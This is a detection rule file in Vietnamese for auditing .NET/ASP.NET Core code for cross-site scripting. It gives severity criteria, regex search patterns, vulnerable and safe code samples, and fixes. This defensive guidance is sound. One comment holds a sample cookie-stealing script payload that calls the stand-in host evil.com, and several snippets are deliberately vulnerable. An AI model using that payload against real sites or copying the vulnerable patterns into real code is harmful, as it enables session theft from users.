---
id: XSS
severity_max: HIGH
applies_to: dotnet
overrides: generic/03-xss.md
---

# Cross-Site Scripting (XSS) — .NET 10 / ASP.NET Core Specialization

> Override cho rule chung `rules/generic/03-xss.md`. Áp dụng khi `primary_language: dotnet`.

## Intent (.NET-specific)

Razor (`.cshtml`) auto-encode mọi `@expression` theo mặc định — khác với PHP/Node, đây là điểm mạnh của ASP.NET Core. Lỗ hổng chỉ xuất hiện khi code **chủ động bypass** cơ chế này: `@Html.Raw(userInput)`, trả `IHtmlString`/`HtmlString` chứa L1 chưa sanitize, hoặc Blazor dùng `MarkupString` cho nội dung user-controlled. Vibe code thường bypass vì muốn render "rich text"/"preview markdown"/"user bio có format" và không biết `Html.Raw` tắt hoàn toàn auto-encode.

Blazor Server/WebAssembly có cơ chế tương tự: binding `@code` thường an toàn, nhưng `MarkupString` render raw HTML giống `Html.Raw`.

## Khi nào HIGH

- `@Html.Raw(model.UserBio)` hoặc bất kỳ `Html.Raw(x)` với `x` là L1 (route/query/body/form) hoặc L1 stored (comment, bio, review lưu DB nhưng gốc từ user khác).
- Controller trả `IHtmlString`/`HtmlString`/`ContentResult` với `Content` chứa L1 chưa escape và `ContentType = "text/html"`.
- Blazor `MarkupString` bọc trực tiếp giá trị người dùng nhập: `(MarkupString)userInput`.
- `@Html.Raw(Json.Serialize(...))` khi payload có thể chứa `</script>` breakout do không escape đúng.
- Minimal API trả HTML string ghép trực tiếp từ query/body: `Results.Content($"<div>{name}</div>", "text/html")`.
- Response header `Content-Type` bị set thủ công `text/html` cho action trả string ghép L1 (bỏ qua Razor encode vì không đi qua view engine).

## Khi nào MEDIUM (giảm cấp)

- `Html.Raw` chỉ dùng cho nội dung có sanitize trước (HtmlSanitizer, Ganss.XSS) với whitelist tag.
- Reflected XSS cần social engineering (link) và có CSP `script-src 'self'` chặn inline.
- Nội dung chỉ hiển thị trong trang admin-only đã auth, risk thấp hơn (nhưng vẫn nên fix).

## Cách reasoning

1. Grep sink: `Html.Raw`, `IHtmlString`, `HtmlString`, `MarkupString`, `Results.Content(...,"text/html")`, `ContentType = "text/html"`.
2. Read view/component chứa sink — giá trị render tới từ đâu: `Model.*`, `ViewBag.*`, route/query/body parameter, hay DB entity field do user khác nhập?
3. Trace L1-L4 giống generic; đặc biệt chú ý field lưu DB nhưng nguồn gốc L1 (comment, review, profile bio) → vẫn L1 stored.
4. Verify mitigation: có `HtmlSanitizer`/`Ganss.Xss.HtmlSanitizer`/`Microsoft.AspNetCore.Antiforgery`? Có whitelist tag/attribute rõ ràng trước khi `Html.Raw`?
5. Razor `@expression` thông thường (không `Html.Raw`) auto-encode — KHÔNG flag.

## Search patterns

```
# Razor Html.Raw bypass encode
@Html\.Raw\s*\(
Html\.Raw\s*\(\s*(Model|ViewBag|\w+\.(Body|Content|Bio|Comment))

# IHtmlString / HtmlString trực tiếp từ input
new\s+HtmlString\s*\(\s*(Request\.|Model\.)
return\s+.*IHtmlString

# Blazor MarkupString từ input
\(MarkupString\)\s*\w*(Input|UserInput|Content|Body|Comment)

# Content result trả HTML ghép string
Results\.Content\s*\(\s*\$["'][^"']*\{[^}]*\}[^"']*["']\s*,\s*["']text/html["']
ContentType\s*=\s*["']text/html["']
```

## Examples

### HIGH — flag

```csharp
// Razor view — bypass auto-encode
@* Views/Profile/Show.cshtml *@
<div class="bio">
    @Html.Raw(Model.Bio)  @* Model.Bio là L1 stored — user khác đọc là bị XSS *@
</div>
```

```csharp
// Blazor component render raw HTML từ input
<div>
    @((MarkupString)Comment.Body)
</div>
@code {
    // Comment.Body là L1 stored, không sanitize trước khi cast MarkupString
}
```

```csharp
// Minimal API ghép HTML trực tiếp từ query
app.MapGet("/greet", (string name) =>
    Results.Content($"<h1>Xin chào {name}</h1>", "text/html"));
// ?name=<script>fetch('//evil.com/?c='+document.cookie)</script>
```

```csharp
// Controller action trả HtmlString từ request body
[HttpPost]
public IActionResult Preview([FromBody] PreviewRequest req)
{
    return Content(req.Html, "text/html");  // req.Html là L1, không sanitize
}
```

### NOT high — không flag (hoặc downgrade)

```csharp
// Razor @expression thông thường — auto-encode
<div class="bio">
    @Model.Bio  @* an toàn — Razor tự escape < > & " ' *@
</div>
```

```csharp
// Html.Raw sau khi sanitize whitelist
@using Ganss.Xss
@{
    var sanitizer = new HtmlSanitizer();
    var clean = sanitizer.Sanitize(Model.Bio, new HtmlSanitizerOptions
    {
        AllowedTags = { "b", "i", "a", "p" }
    });
}
<div>@Html.Raw(clean)</div>
```

```razor
@* Blazor bind thông thường không cast MarkupString *@
<p>@Comment.Body</p>
```

## Fix recommendation

1. **Mặc định**: dùng `@Model.Field` thông thường trong Razor, không `Html.Raw`.
2. **Cần render rich text/markdown**: sanitize whitelist trước khi `Html.Raw`:
   ```csharp
   using Ganss.Xss;
   var sanitizer = new HtmlSanitizer();
   var clean = sanitizer.Sanitize(dirty, new HtmlSanitizerOptions { AllowedTags = { "b", "i", "a", "p" } });
   ```
3. **Blazor**: chỉ dùng `MarkupString` sau khi qua sanitizer tương tự; ưu tiên binding thường (`@variable`) khi có thể.
4. **Minimal API trả HTML**: dùng Razor view/component thay vì ghép string; nếu buộc phải ghép, encode bằng `System.Net.WebUtility.HtmlEncode`.
5. **Set CSP header**: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'`.
6. **Cookie auth**: `HttpOnly` + `SameSite=Lax/Strict` để XSS không đọc được session cookie.

## Cross-references

- `11-csrf`: XSS có thể dùng để đọc anti-forgery token nhúng trong DOM.
- `17-verbose-error-debug-mode`: trang lỗi render lại input không escape → reflected XSS phụ.
- `07-mass-assignment`: field bio/content bind trực tiếp từ request cũng là nguồn XSS nếu không kiểm soát khi render lại.
